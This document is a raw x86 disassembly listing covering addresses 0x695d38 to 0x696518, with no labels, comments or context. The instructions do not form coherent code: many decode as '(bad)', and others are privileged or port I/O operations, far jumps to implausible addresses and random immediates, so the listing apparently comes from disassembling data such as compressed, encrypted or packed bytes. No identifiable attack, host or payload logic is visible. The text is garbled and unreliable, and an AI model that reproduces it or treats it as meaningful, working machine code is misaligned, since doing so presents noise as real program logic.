  695d38:	fistp  WORD PTR [ebx+0x4d]
  695d3b:	pop    ebx
  695d3c:	imul   eax,ebx,0xab0f78fc
  695d42:	adc    eax,0xd61fc531
  695d47:	or     edi,edx
  695d49:	push   edi
  695d4a:	adc    BYTE PTR [ebx-0x1cbfe5c1],al
  695d50:	aas    
  695d51:	call   ecx
  695d53:	xchg   ecx,eax
  695d54:	(bad)  
  695d55:	pushf  
  695d56:	inc    edx
  695d57:	pop    edx
  695d58:	fldz   
  695d5a:	mov    ebx,0xd17a7c47
  695d5f:	ds sahf 
  695d61:	add    DWORD PTR [ebp-0x3a],ebp
  695d64:	push   0xbce7b16c
  695d69:	cmp    DWORD PTR [esi],eax
  695d6b:	push   0x14145f72
  695d70:	stos   DWORD PTR es:[edi],eax
  695d71:	dec    ebp
  695d72:	aam    0x74
  695d74:	mov    esp,0xef28c13b
  695d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  695d7a:	stos   BYTE PTR es:[edi],al
  695d7b:	(bad)  
  695d7c:	scas   al,BYTE PTR es:[edi]
  695d7d:	(bad)  
  695d7e:	jmp    0x25a214a8
  695d83:	jmp    0x695d85
  695d85:	ror    DWORD PTR [edx+ebp*1+0xc],0x94
  695d8a:	mov    BYTE PTR ds:0x9a68c6e2,cl
  695d90:	mov    ch,BYTE PTR [ebp+0x20]
  695d93:	sbb    al,0x80
  695d95:	les    edx,FWORD PTR [ebx-0x6c]
  695d98:	(bad)  
  695d99:	mov    ecx,0xc4e73485
  695d9e:	pop    esi
  695d9f:	(bad)  
  695da0:	fidiv  WORD PTR ds:0x4db65457
  695da6:	iret   
  695da7:	in     al,dx
  695da8:	(bad)  
  695daa:	dec    ebx
  695dab:	sub    BYTE PTR [ebx],bh
  695dad:	jg     0x695d4f
  695daf:	adc    al,0x72
  695db1:	stos   DWORD PTR es:[edi],eax
  695db2:	cmp    bl,ah
  695db4:	jno    0x695dcc
  695db6:	xlat   BYTE PTR ds:[ebx]
  695db7:	inc    BYTE PTR [eax-0x78]
  695dba:	shl    BYTE PTR [edx-0x2a8ab3bc],cl
  695dc0:	mov    ecx,0x18095e10
  695dc5:	xor    al,0xf5
  695dc7:	jno    0x695dd5
  695dc9:	in     eax,dx
  695dca:	adc    BYTE PTR [eax+0x46],0x8a
  695dce:	add    ecx,edi
  695dd0:	mov    ebp,0x7d9d10bf
  695dd5:	mov    al,ds:0x3db7b2f8
  695dda:	fidiv  DWORD PTR [eax+edi*4]
  695ddd:	dec    eax
  695dde:	sbb    edx,DWORD PTR [edi]
  695de0:	int    0xe7
  695de2:	and    al,0xe
  695de4:	lock pop ss
  695de6:	or     ch,ch
  695de8:	pusha  
  695de9:	ss fadd st,st(1)
  695dec:	push   cs
  695ded:	retf   0x4fba
  695df0:	push   cs
  695df1:	aad    0xdd
  695df3:	mov    cl,0x8b
  695df5:	mov    ds:0xc34f254c,al
  695dfa:	pop    edi
  695dfb:	faddp  st(1),st
  695dfd:	and    BYTE PTR [eax],bh
  695dff:	lock mov ds:0x2b0ad7ef,eax
  695e05:	jbe    0x695e2b
  695e07:	mov    edi,0x483b4d22
  695e0c:	mov    DWORD PTR [ebp+0x23],esp
  695e0f:	mov    eax,DWORD PTR [edx-0x4a8d322d]
  695e15:	not    dh
  695e17:	inc    ebx
  695e18:	pop    esi
  695e19:	adc    esi,DWORD PTR ds:0xe93ef90e
  695e1f:	pop    ss
  695e20:	push   es
  695e21:	sbb    ah,BYTE PTR [esi]
  695e23:	ret    
  695e24:	jecxz  0x695e06
  695e26:	jl     0x695e79
  695e28:	mov    ebx,es
  695e2a:	xchg   esp,eax
  695e2b:	and    eax,DWORD PTR [ebx+0x6687401]
  695e31:	push   ebp
  695e32:	ret    0xf160
  695e35:	retf   0x3303
  695e38:	cmp    eax,0x4233f24e
  695e3d:	retf   0xa558
  695e40:	imul   ecx,DWORD PTR [ebx-0x78],0xb6c79472
  695e47:	mov    eax,ds:0xdcde077d
  695e4c:	xor    BYTE PTR [esi],0x4e
  695e4f:	imul   ebp,DWORD PTR [edx],0xd993d708
  695e55:	leave  
  695e56:	sub    BYTE PTR [edx-0x6b],dh
  695e59:	ficomp WORD PTR [edi-0x67]
  695e5c:	rcr    BYTE PTR [edi-0xf4378a4],1
  695e62:	and    ebp,edi
  695e64:	dec    DWORD PTR [esp+edi*2+0x2e3de283]
  695e6b:	pop    edx
  695e6c:	mov    ds:0x7f59da5c,eax
  695e71:	scas   al,BYTE PTR es:[edi]
  695e72:	(bad)  
  695e74:	push   ebp
  695e75:	xchg   esi,eax
  695e76:	add    eax,0x30e47447
  695e7b:	js     0x695e97
  695e7d:	lahf   
  695e7e:	ins    DWORD PTR es:[edi],dx
  695e7f:	je     0x695e36
  695e81:	xor    ecx,esp
  695e83:	add    al,0xa4
  695e85:	ins    DWORD PTR es:[edi],dx
  695e86:	dec    ebp
  695e87:	sahf   
  695e88:	cwde   
  695e89:	mov    cl,0xe
  695e8b:	fisub  DWORD PTR [esi+0xb]
  695e8e:	xchg   ebp,ebx
  695e90:	inc    ebx
  695e91:	push   esp
  695e92:	in     al,dx
  695e93:	jb     0x695ef8
  695e95:	sahf   
  695e96:	popa   
  695e97:	cs sbb ebx,esi
  695e9a:	imul   ecx,DWORD PTR [ebx+0x19],0x93f3dad9
  695ea1:	and    DWORD PTR [ecx+0x4f9faad1],edi
  695ea7:	in     eax,dx
  695ea8:	dec    eax
  695ea9:	xchg   BYTE PTR [ebp+0x18],al
  695eac:	inc    ebx
  695ead:	and    edi,DWORD PTR [ecx-0x7a6ea10e]
  695eb3:	jmp    0x695e54
  695eb5:	xchg   esp,eax
  695eb6:	mov    bl,0x74
  695eb8:	adc    al,BYTE PTR [ebx]
  695eba:	dec    ebp
  695ebb:	clc    
  695ebc:	out    dx,eax
  695ebd:	mov    ecx,0xa0c93e10
  695ec2:	dec    ecx
  695ec3:	mov    cl,0xad
  695ec5:	cdq    
  695ec6:	xor    dh,BYTE PTR [ecx-0x37452616]
  695ecc:	cmp    DWORD PTR [ebx+ebx*8],edx
  695ecf:	out    0xb1,al
  695ed1:	push   0x2ec7919a
  695ed6:	xchg   edi,eax
  695ed7:	ins    BYTE PTR es:[edi],dx
  695ed8:	xor    al,0x5e
  695eda:	cmp    DWORD PTR [esi+0x76457818],edx
  695ee0:	add    DWORD PTR [edi],esi
  695ee2:	inc    edx
  695ee3:	fwait
  695ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  695ee5:	dec    ebx
  695ee6:	mov    edx,0x289b1904
  695eeb:	pop    esp
  695eec:	and    dl,BYTE PTR [ebx+ebp*8+0x16b3ebd4]
  695ef3:	ret    0x633
  695ef6:	clc    
  695ef7:	jmp    0x63b6035c
  695efc:	push   ss
  695efd:	test   bh,bh
  695eff:	imul   edx,DWORD PTR [edx-0x1265268a],0x14576473
  695f09:	sub    eax,0x25d34b64
  695f0e:	lods   eax,DWORD PTR ds:[esi]
  695f0f:	and    al,0x14
  695f11:	mov    edi,0x38118cd1
  695f16:	das    
  695f17:	mov    al,0x3
  695f19:	(bad)  
  695f1a:	imul   ecx
  695f1c:	loope  0x695f4b
  695f1e:	mov    bl,0x1
  695f20:	jmp    0x695ef5
  695f22:	enter  0x2293,0xa0
  695f26:	add    ecx,DWORD PTR ss:[bp-0x39]
  695f2b:	retf   
  695f2c:	xchg   esi,eax
  695f2d:	popf   
  695f2e:	jl     0x695ebe
  695f30:	loop   0x695fa3
  695f32:	cmp    dl,BYTE PTR ss:[esi+0x7152685]
  695f39:	aaa    
  695f3a:	mov    ebx,0x312b3a1
  695f3f:	ss jb  0x695ee1
  695f42:	jb     0x695ed2
  695f44:	popa   
  695f45:	mov    al,ds:0x5b039ab3
  695f4a:	xor    al,0xa7
  695f4c:	push   eax
  695f4d:	jge    0x695fa0
  695f4f:	lock test BYTE PTR [edi+0x44],0x92
  695f54:	and    al,0xcb
  695f56:	call   0xfec1c863
  695f5b:	pop    edi
  695f5c:	cmp    BYTE PTR [edx+edi*1],0x15
  695f60:	mov    ds:0xa131dc36,eax
  695f65:	mov    dh,0x6b
  695f67:	ret    
  695f68:	mov    edx,0xd061d726
  695f6d:	pop    es
  695f6e:	adc    eax,0x1cf421e8
  695f73:	out    dx,al
  695f74:	ret    0xb4d5
  695f77:	(bad)
  695f7a:	mov    fs,esp
  695f7c:	mov    eax,ds:0xf34ec1f3
  695f81:	int3   
  695f82:	mov    esp,ss
  695f84:	jne    0x695f8b
  695f86:	pusha  
  695f87:	(bad)  
  695f88:	ficom  WORD PTR [ebx+0x4f]
  695f8b:	loopne 0x695fa1
  695f8d:	ins    BYTE PTR es:[edi],dx
  695f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  695f8f:	rcl    BYTE PTR [eax+0x6a4f22e],0x8d
  695f96:	aaa    
  695f97:	push   0x22b2d7aa
  695f9c:	pop    esp
  695f9d:	jb     0x695f22
  695f9f:	xchg   ecx,eax
  695fa0:	xchg   BYTE PTR [ebx-0x41],bh
  695fa3:	lods   al,BYTE PTR cs:[esi]
  695fa5:	xchg   esi,eax
  695fa6:	jmp    0x90c720ed
  695fab:	pop    ds
  695fac:	(bad)  
  695fad:	sbb    DWORD PTR [eax],esp
  695faf:	inc    edx
  695fb0:	xchg   BYTE PTR [ecx],cl
  695fb2:	sbb    al,0x24
  695fb4:	imul   ebp,DWORD PTR [edx],0xffffffc5
  695fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  695fb8:	in     al,0x32
  695fba:	jge    0x695f9f
  695fbc:	push   ebp
  695fbd:	cmp    al,0xcf
  695fbf:	or     ebx,DWORD PTR [ebp-0x1b]
  695fc2:	in     al,dx
  695fc3:	mov    esi,0x2e29d6db
  695fc8:	xchg   esp,eax
  695fc9:	add    al,bl
  695fcb:	popa   
  695fcc:	mov    al,ds:0x9fa407e0
  695fd1:	or     ebx,ebx
  695fd3:	jo     0x695ff5
  695fd5:	mov    fs,esi
  695fd7:	inc    ebp
  695fd8:	fdiv   st,st(6)
  695fda:	cdq    
  695fdb:	(bad)  
  695fdc:	in     al,0x46
  695fde:	dec    esp
  695fdf:	push   cs
  695fe0:	repz push eax
  695fe2:	push   ecx
  695fe3:	call   0xab1eefa7
  695fe8:	mov    eax,0x9803d67a
  695fed:	adc    esi,DWORD PTR [ebp+0x4f6950de]
  695ff3:	xchg   ebx,eax
  695ff4:	clc    
  695ff5:	imul   eax,DWORD PTR [ebp+0x2070ed57],0x93320f1e
  695fff:	addr16 in eax,0x67
  696002:	test   eax,0x6053a672
  696007:	retf   
  696008:	pop    esp
  696009:	cmp    al,0x6c
  69600b:	icebp  
  69600c:	add    eax,0xddabf9c0
  696011:	sub    eax,0xe481f6aa
  696016:	mov    eax,0xa8a2ca21
  69601b:	(bad)  
  69601d:	hlt    
  69601e:	adc    bh,BYTE PTR [esi]
  696020:	inc    esp
  696021:	jp     0x696032
  696023:	xchg   DWORD PTR [edi+0x37c0214c],edi
  696029:	in     eax,dx
  69602a:	outs   dx,DWORD PTR ds:[esi]
  69602b:	cmp    bl,BYTE PTR [esi+eax*4+0x3a]
  69602f:	mov    edi,0x175d999d
  696034:	xchg   ebp,eax
  696035:	or     al,0x52
  696037:	adc    esp,DWORD PTR [eax-0x2e98cf7]
  69603d:	fnstenv ds:0xe8eb452f
  696043:	mov    ecx,0x4b32976
  696048:	mov    eax,0xbf850c83
  69604d:	mov    esi,0x8c7688a4
  696052:	into   
  696053:	xor    BYTE PTR [ebp-0x3a],dl
  696056:	mov    dh,0xe2
  696058:	push   esi
  696059:	lods   eax,DWORD PTR ds:[esi]
  69605a:	repz test eax,0x6c4ecf38
  696060:	push   ss
  696061:	fist   WORD PTR [esi]
  696063:	adc    esp,edi
  696065:	fwait
  696066:	lea    ecx,[edi]
  696068:	push   edx
  696069:	aaa    
  69606a:	call   0x9b96323c
  69606f:	and    ecx,DWORD PTR [ecx-0x8]
  696072:	xchg   ebx,eax
  696073:	xor    bl,BYTE PTR [edx+0x661adee4]
  696079:	and    edx,DWORD PTR [ebx+eiz*1-0xd]
  69607d:	dec    esi
  69607e:	lahf   
  69607f:	imul   ecx,DWORD PTR [edi-0x37],0x3ba90946
  696086:	gs cli 
  696088:	pop    ebp
  696089:	sub    al,0x90
  69608b:	sub    eax,0xc31aacb5
  696090:	cli    
  696091:	fcom   QWORD PTR [esi+0xe]
  696094:	or     DWORD PTR [esi+0x1e9f7c24],edi
  69609a:	jecxz  0x6960d9
  69609c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69609d:	and    eax,0xa8418ec9
  6960a2:	mov    eax,ds:0xa5c275db
  6960a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6960a8:	dec    sp
  6960aa:	mov    ebx,0x36766f37
  6960af:	das    
  6960b0:	sub    DWORD PTR [ebp+ecx*2+0x715a51c4],esi
  6960b7:	xchg   BYTE PTR [edx-0x178a6a6b],bl
  6960bd:	loope  0x6960b8
  6960bf:	inc    edx
  6960c0:	inc    edx
  6960c1:	cmp    BYTE PTR [edi-0x6d90fa15],0x25
  6960c8:	and    al,0xd9
  6960ca:	call   0x964b0b14
  6960cf:	scas   eax,DWORD PTR es:[edi]
  6960d0:	and    BYTE PTR [esi],dh
  6960d2:	ficom  DWORD PTR [ecx-0x5f3ac6c0]
  6960d8:	inc    eax
  6960d9:	mov    DWORD PTR [ebx],edx
  6960db:	sysret 
  6960dd:	into   
  6960de:	into   
  6960df:	xchg   ebp,eax
  6960e0:	push   ss
  6960e1:	add    DWORD PTR [ecx-0x69],0x25998a04
  6960e8:	jb     0x696141
  6960ea:	test   al,0x33
  6960ec:	jns    0x69613e
  6960ee:	mov    esp,0xc624fc88
  6960f3:	and    al,0x7d
  6960f5:	xor    al,0xed
  6960f7:	retf   0xc6eb
  6960fa:	cmp    eax,0x4431f9e8
  6960ff:	xchg   ebx,eax
  696100:	jmp    0x69611d
  696102:	rcl    BYTE PTR [ebx-0x26],0xa8
  696106:	out    0x6b,eax
  696108:	dec    edx
  696109:	push   edi
  69610a:	(bad)  
  69610c:	mov    ecx,0x31e99362
  696111:	test   BYTE PTR [esi-0x68],al
  696114:	push   cs
  696115:	ror    BYTE PTR [esi],1
  696117:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  696118:	cmp    ch,BYTE PTR [edx+0x44]
  69611b:	les    ecx,FWORD PTR [esi]
  69611d:	in     eax,0x38
  69611f:	push   ss
  696120:	ret    
  696121:	pop    ebx
  696122:	adc    eax,DWORD PTR [ecx-0x6f04477f]
  696128:	or     al,0x36
  69612a:	call   0x46182415
  69612f:	add    eax,0xdca6c7fa
  696134:	xor    DWORD PTR [ecx-0x201df141],esp
  69613a:	iret   
  69613b:	sbb    al,0x24
  69613d:	or     edx,esi
  69613f:	rol    BYTE PTR [edi+0x53],1
  696142:	sbb    ecx,ecx
  696144:	xor    eax,0x7b10b60f
  696149:	outs   dx,DWORD PTR ds:[esi]
  69614a:	lods   al,BYTE PTR ds:[esi]
  69614b:	std    
  69614c:	sub    eax,DWORD PTR [edi+0x31]
  69614f:	out    0xfe,eax
  696151:	xchg   esp,eax
  696152:	ds out 0xc3,eax
  696155:	sar    BYTE PTR [edx-0x48],0xcf
  696159:	stc    
  69615a:	cmp    eax,0x6be66b0f
  69615f:	in     eax,dx
  696160:	pushf  
  696161:	aad    0x12
  696163:	scas   eax,DWORD PTR es:[edi]
  696164:	jmp    0xaf4f:0xadd3bca4
  69616b:	and    ah,0x60
  69616e:	mov    edi,0x163bb4fa
  696173:	aaa    
  696174:	jmp    DWORD PTR [eax+0x5d9ebfe1]
  69617a:	pop    ecx
  69617b:	mov    eax,ecx
  69617d:	stos   DWORD PTR es:[edi],eax
  69617e:	jl     0x69617a
  696180:	xchg   DWORD PTR [esi],ebx
  696182:	jp     0x69619c
  696184:	mov    BYTE PTR [edi],bh
  696186:	sbb    DWORD PTR [esi],edi
  696188:	sub    eax,0x98d30aa
  69618d:	xor    al,al
  69618f:	in     eax,dx
  696190:	or     eax,0xc3e2a2b2
  696195:	push   ds
  696196:	add    edx,DWORD PTR [ebx]
  696198:	pop    ebx
  696199:	cmp    DWORD PTR [esi+eax*8-0x2260256f],ecx
  6961a0:	into   
  6961a1:	xchg   ebx,ebp
  6961a3:	pushf  
  6961a4:	dec    ecx
  6961a5:	in     eax,0xf6
  6961a7:	es inc esp
  6961a9:	inc    ecx
  6961aa:	(bad)  
  6961ab:	in     eax,dx
  6961ac:	and    al,0x36
  6961ae:	ss and eax,0x79230807
  6961b4:	or     ecx,DWORD PTR [edi+0xf]
  6961b7:	mov    ds:0x3e5e3e0a,al
  6961bc:	js     0x696238
  6961be:	sahf   
  6961bf:	push   ds
  6961c0:	div    BYTE PTR [ebx+0x6]
  6961c3:	leave  
  6961c4:	mov    ah,0xd3
  6961c6:	fsubr  QWORD PTR [edi+0x22]
  6961c9:	fisttp QWORD PTR [esi+eax*4-0x28e41b6c]
  6961d0:	sahf   
  6961d1:	inc    ebp
  6961d2:	and    edi,DWORD PTR ds:0x87ce66bf
  6961d8:	mov    bh,0x6a
  6961da:	and    DWORD PTR [esi+ebx*8],eax
  6961dd:	ror    BYTE PTR [ebx+eax*1],cl
  6961e0:	xchg   edx,eax
  6961e1:	jecxz  0x696182
  6961e3:	jno    0x6961e0
  6961e5:	pop    eax
  6961e6:	in     eax,dx
  6961e7:	push   ebp
  6961e8:	and    al,0x96
  6961ea:	push   eax
  6961eb:	outs   dx,BYTE PTR ds:[esi]
  6961ec:	mov    cl,0x19
  6961ee:	(bad)  
  6961ef:	push   edx
  6961f0:	xchg   edx,eax
  6961f1:	sbb    ch,BYTE PTR [edi]
  6961f3:	or     eax,DWORD PTR [ecx]
  6961f5:	sbb    eax,0xe36c5447
  6961fa:	mov    ch,0xa0
  6961fc:	sub    BYTE PTR [ebp-0x2463269c],dl
  696202:	add    BYTE PTR [ecx],0xf1
  696205:	loopne 0x696211
  696207:	xchg   esp,eax
  696208:	pop    ebx
  696209:	xchg   ebx,eax
  69620a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69620b:	adc    dh,ah
  69620d:	nop
  69620e:	mov    ebp,esi
  696210:	cs sub eax,0xaa4c65ed
  696216:	test   al,0x48
  696218:	inc    edi
  696219:	cmp    ah,BYTE PTR [ecx-0x1dcf87e0]
  69621f:	mov    eax,ds:0xf6ee57c8
  696224:	mov    esi,0xf340049e
  696229:	cwde   
  69622a:	inc    edi
  69622b:	xor    dl,dl
  69622d:	inc    esi
  69622e:	cs dec ebp
  696230:	mov    ecx,eax
  696232:	mov    bl,cl
  696234:	loope  0x69629d
  696236:	pop    es
  696237:	xor    BYTE PTR [esi-0x46530a06],ch
  69623d:	mov    edx,0xa8139dac
  696242:	stc    
  696243:	sahf   
  696244:	and    DWORD PTR ss:[edx],edi
  696247:	xor    al,bh
  696249:	fs inc edi
  69624b:	sbb    BYTE PTR [ebx],ch
  69624d:	mov    ch,0xf7
  69624f:	pop    ebx
  696250:	or     al,0xcb
  696252:	mov    ebp,DWORD PTR [esi]
  696254:	idiv   BYTE PTR [ebp+0x6b]
  696257:	adc    DWORD PTR [edi],esi
  696259:	and    al,0xf5
  69625b:	mov    al,ds:0x5e48f723
  696260:	fs xchg edx,eax
  696262:	add    DWORD PTR [edi-0x4],edi
  696265:	test   eax,0x1e92b940
  69626a:	test   BYTE PTR [esi],0x5e
  69626d:	and    BYTE PTR [esi-0x73b19eca],bh
  696273:	xchg   ebp,eax
  696274:	fucomi st,st(3)
  696276:	lods   al,BYTE PTR ds:[esi]
  696277:	outs   dx,DWORD PTR ds:[esi]
  696278:	loopne 0x696259
  69627a:	pop    esi
  69627b:	or     bh,cl
  69627d:	call   0xaf4695d
  696282:	data16 das 
  696284:	xchg   DWORD PTR [eax],esi
  696286:	retf   0xc098
  696289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69628a:	dec    ebp
  69628b:	push   ebx
  69628c:	fmulp  st(7),st
  69628e:	xor    al,0xb1
  696290:	add    al,0x3a
  696292:	fwait
  696293:	imul   eax,DWORD PTR [eax+0x24],0x6c20dd16
  69629a:	and    ch,BYTE PTR [ecx+0x61]
  69629d:	std    
  69629e:	mov    ds:0x58e6c3f5,eax
  6962a3:	test   esi,ebp
  6962a5:	inc    ecx
  6962a6:	shl    ebp,cl
  6962a8:	jns    0x6962e6
  6962aa:	cmp    DWORD PTR [eax+0x2b],edx
  6962ad:	mov    DWORD PTR es:[edi],ecx
  6962b0:	(bad)  [edx]
  6962b2:	mov    al,ds:0x9cfcc6ed
  6962b7:	dec    ebx
  6962b8:	shr    al,cl
  6962ba:	jmp    0x4865f957
  6962bf:	test   DWORD PTR [eax+0x353ffabe],esp
  6962c5:	or     al,0xb2
  6962c7:	fwait
  6962c8:	add    BYTE PTR ds:0x5e3d6811,ch
  6962ce:	cmp    eax,DWORD PTR [esi-0x685e9ead]
  6962d4:	lock (bad) 
  6962d6:	icebp  
  6962d7:	cmp    ebp,0x36
  6962da:	shl    ebx,cl
  6962dc:	retf   
  6962dd:	lods   eax,DWORD PTR ds:[esi]
  6962de:	fcom   st(6)
  6962e0:	test   BYTE PTR [ebp-0x2ff05ac3],bh
  6962e6:	shl    BYTE PTR [ebx],cl
  6962e8:	jo     0x696366
  6962ea:	je     0x6962a6
  6962ec:	scas   eax,DWORD PTR es:[edi]
  6962ed:	sub    BYTE PTR [eax-0x2b37fc5],cl
  6962f3:	sub    dh,cl
  6962f5:	rcr    bl,cl
  6962f7:	or     bl,dh
  6962f9:	lods   al,BYTE PTR ds:[esi]
  6962fa:	dec    esp
  6962fb:	loopne 0x696350
  6962fd:	sbb    DWORD PTR [ecx],esi
  6962ff:	jle    0x69628d
  696301:	mov    dh,0xff
  696303:	add    BYTE PTR [edx+0xd9a145d],bl
  696309:	cmp    eax,0x884d07c4
  69630e:	adc    bh,BYTE PTR [ecx-0x5aceefed]
  696314:	dec    ebp
  696315:	mov    ebx,0xca68d2d
  69631a:	test   al,0xfd
  69631c:	adc    eax,0x1a2f8763
  696321:	inc    eax
  696322:	jbe    0x696325
  696324:	add    BYTE PTR [ebx-0x419e290],bl
  69632a:	out    0xaf,al
  69632c:	daa    
  69632d:	ja     0x6962fd
  69632f:	and    ah,BYTE PTR [eax]
  696331:	push   edx
  696332:	nop
  696333:	sar    BYTE PTR [ebp-0x37],1
  696336:	popa   
  696337:	xchg   BYTE PTR [ebx-0x64c4f00b],ah
  69633d:	lea    esi,[ebx-0x1a]
  696340:	sub    edi,DWORD PTR [ebp+0x7bfa85e9]
  696346:	push   edi
  696347:	cmp    al,0x8e
  696349:	pop    ss
  69634a:	jecxz  0x6962fc
  69634c:	cmp    ch,dl
  69634e:	dec    ecx
  69634f:	xchg   ebp,eax
  696350:	sti    
  696351:	adc    al,0xdb
  696353:	push   ebx
  696354:	sbb    eax,0x45b6ec6f
  696359:	cmp    edi,ecx
  69635b:	pop    esi
  69635c:	lds    ebp,FWORD PTR [esi-0xe]
  69635f:	mov    edx,0x7a73acfd
  696364:	jae    0x69637a
  696366:	test   al,0xe0
  696368:	cmp    al,0x67
  69636a:	cmp    al,0xb1
  69636c:	iret   
  69636d:	repnz cmp DWORD PTR [ecx],esi
  696370:	popf   
  696371:	sub    al,0xd3
  696373:	arpl   WORD PTR [ebx+0x68],cx
  696376:	pop    ecx
  696377:	lods   al,BYTE PTR ds:[esi]
  696378:	push   es
  696379:	or     eax,0x15af86cb
  69637e:	repz xor al,0xec
  696381:	dec    ecx
  696382:	push   eax
  696383:	inc    edi
  696384:	jb     0x6963f5
  696386:	ficomp DWORD PTR [ecx]
  696388:	xchg   ebp,eax
  696389:	(bad)  
  69638a:	xchg   edi,eax
  69638b:	leave  
  69638c:	jge    0x69637c
  69638e:	es loop 0x69633e
  696391:	inc    esp
  696392:	jle    0x696387
  696394:	test   DWORD PTR [ebp+ebp*2-0x48e46c48],eax
  69639b:	jns    0x6963d6
  69639d:	sbb    al,0xab
  69639f:	aam    0x4f
  6963a1:	and    ebx,DWORD PTR ds:0x42dcf89b
  6963a7:	in     eax,0x7c
  6963a9:	ror    DWORD PTR [ecx+0x39],0x29
  6963ad:	jecxz  0x696336
  6963af:	mov    cl,0xea
  6963b1:	(bad)  
  6963b2:	and    al,0xd
  6963b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6963b5:	mov    al,0xb2
  6963b7:	mov    esp,0x45350243
  6963bc:	es clc 
  6963be:	imul   edx,DWORD PTR [ebx+0x6df9747a],0xffffffd9
  6963c5:	xchg   edi,eax
  6963c6:	push   ss
  6963c7:	push   ds
  6963c8:	push   cs
  6963c9:	mov    al,0x6a
  6963cb:	loope  0x696367
  6963cd:	mov    al,ds:0x85ea59f2
  6963d2:	jnp    0xf91cc2c8
  6963d8:	fld    QWORD PTR [esp+edi*4+0x11]
  6963dc:	pop    esi
  6963dd:	add    eax,0xad57d5a1
  6963e2:	xor    DWORD PTR [esp+eiz*4],edi
  6963e5:	into   
  6963e6:	test   DWORD PTR [ecx-0x49805549],ebp
  6963ec:	inc    eax
  6963ed:	and    ecx,ebx
  6963ef:	idiv   DWORD PTR [edi-0x1]
  6963f2:	ficom  WORD PTR [ecx-0x2e694fc7]
  6963f8:	out    dx,eax
  6963f9:	jmp    0x696479
  6963fb:	jmp    0xabe0bb49
  696400:	add    dh,dl
  696402:	adc    bl,dh
  696404:	sti    
  696405:	and    bl,BYTE PTR [esi+0x1008e361]
  69640b:	dec    ecx
  69640c:	push   0x9381664f
  696411:	ins    BYTE PTR es:[edi],dx
  696412:	stos   DWORD PTR es:[edi],eax
  696413:	retf   0x7ddf
  696416:	rol    DWORD PTR [edi+0x5d],0x3b
  69641a:	jbe    0x6963bf
  69641c:	adc    dh,ch
  69641e:	mov    al,cl
  696420:	sbb    eax,DWORD PTR [edx]
  696422:	jne    0x69642c
  696424:	jle    0x69646d
  696426:	jge    0x6963d1
  696428:	inc    edx
  696429:	jl     0x696443
  69642b:	mov    al,ds:0x31564812
  696430:	call   0xabd8:0x98c90b4c
  696437:	cld    
  696438:	push   0xb476fc61
  69643d:	push   ss
  69643e:	leave  
  69643f:	and    al,0x99
  696441:	adc    dh,dh
  696443:	pusha  
  696444:	xchg   ebp,eax
  696445:	xchg   ecx,eax
  696446:	sti    
  696447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  696448:	cmp    al,0xf5
  69644a:	mov    edx,0xe698ad68
  69644f:	pop    es
  696450:	adc    al,0xdb
  696452:	dec    ecx
  696453:	mov    esi,0x4a91746a
  696458:	inc    BYTE PTR fs:[edx]
  69645b:	push   0xffffffa7
  69645d:	pop    edx
  69645e:	cmp    DWORD PTR [ebx],esp
  696460:	shr    dh,cl
  696462:	mov    eax,ds:0x702ce18e
  696467:	push   edi
  696468:	or     dh,BYTE PTR [eax-0x7f]
  69646b:	ret    0x47f6
  69646e:	pop    edx
  69646f:	aas    
  696470:	test   DWORD PTR [ebx-0x44224335],esi
  696476:	jecxz  0x696406
  696478:	aas    
  696479:	sbb    ebx,edx
  69647b:	pop    es
  69647c:	jbe    0x696466
  69647e:	push   cs
  69647f:	(bad)  
  696480:	jle    0x696438
  696482:	jle    0x69648b
  696484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  696485:	out    dx,eax
  696486:	out    0x8f,al
  696488:	cdq    
  696489:	xchg   esp,eax
  69648a:	imul   esi,DWORD PTR [edx+esi*2+0x2d],0x67ae551e
  696492:	sar    DWORD PTR [ebx],cl
  696494:	(bad)  
  696495:	adc    bh,BYTE PTR [bp+si]
  696498:	xor    ebx,DWORD PTR [edx+esi*2]
  69649b:	add    al,0xa0
  69649d:	xchg   edx,eax
  69649e:	cld    
  69649f:	push   esi
  6964a0:	cld    
  6964a1:	dec    ebx
  6964a2:	fistp  DWORD PTR [edx]
  6964a4:	xchg   ecx,eax
  6964a5:	jnp    0x696477
  6964a7:	push   ebx
  6964a8:	out    0xb4,eax
  6964aa:	inc    esi
  6964ab:	xchg   ebp,eax
  6964ac:	mov    ch,0xc2
  6964ae:	mov    dh,0xf
  6964b0:	push   cs
  6964b1:	iret   
  6964b2:	leave  
  6964b3:	jp     0x6964b0
  6964b5:	out    dx,eax
  6964b6:	lock outs dx,DWORD PTR ds:[esi]
  6964b8:	jecxz  0x696480
  6964ba:	and    al,0x34
  6964bc:	iret   
  6964bd:	addr16 dec edi
  6964bf:	bound  esi,QWORD PTR [edi]
  6964c1:	scas   eax,DWORD PTR es:[edi]
  6964c2:	loopne 0x6964d2
  6964c4:	es dec esi
  6964c6:	ds adc eax,0x866b536a
  6964cc:	sbb    edi,edx
  6964ce:	nop
  6964cf:	out    dx,al
  6964d0:	push   eax
  6964d1:	cwde   
  6964d2:	and    cl,BYTE PTR [eax-0x33e6686f]
  6964d8:	jg     0x6964b5
  6964da:	ds js  0x69648a
  6964dd:	adc    esp,DWORD PTR [ecx+0x132f6908]
  6964e3:	(bad)  
  6964e4:	jmp    0xd18e:0x22942b84
  6964eb:	shl    BYTE PTR [edx],1
  6964ed:	test   al,0x92
  6964ef:	jge    0x6964dd
  6964f1:	test   DWORD PTR [ebp+0x1fe4b5c5],edi
  6964f7:	sbb    BYTE PTR gs:[edi],0xaf
  6964fb:	mov    esp,0x2cbcf31
  696500:	ins    DWORD PTR es:[edi],dx
  696501:	push   ecx
  696502:	jmp    0x775f776e
  696507:	das    
  696508:	dec    BYTE PTR [edi+0x7]
  69650b:	mov    esp,0xcb388078
  696510:	data16 fs and al,0xe6
  696514:	in     eax,0x76
  696516:	push   edi
  696517:	maskmovq mm7,(bad)
  696518:	idiv   DWORD PTR [eax+esi*1+0x6046b865]
